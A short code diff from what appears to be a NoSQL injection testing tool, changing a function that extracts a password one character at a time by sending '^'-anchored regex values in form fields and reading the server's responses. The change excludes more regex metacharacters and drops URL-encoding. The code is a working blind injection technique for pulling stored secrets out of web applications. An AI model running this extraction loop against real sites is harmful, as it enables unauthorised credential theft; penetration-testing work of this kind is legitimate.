@@ -39,12 +39,12 @@ def dumpKnownValue(nsi, form_data, password):
         # for c in alphabet:
         for c in range(0x20, 0x7f):
             c = chr(c) # returns the character that represents the specified unicode.
-            if c not in ["*", "+", ".", "?", "|", "'", '"', "&", " "]:
+            if c not in ["*", "+", ".", "?", "|", "'", '"', "&", " ", '(', ')' , '^', '\\', '[', ']']:
                 # form_data = {}
                 # for element in form_data:
                 #     if "$regex" in element:
                 #         form_data[element] = f"^{urllib.parse.quote_plus(password+c)}"
-                Str.iterateParam(form_data, f"^{urllib.parse.quote_plus(password+c)}")
+                Str.iterateParam(form_data, f"^{(password+c)}")
                 if (nsi.reqMethod == '2'):
                     r = requests.post(nsi.url, data=form_data, verify=False)
                 else:
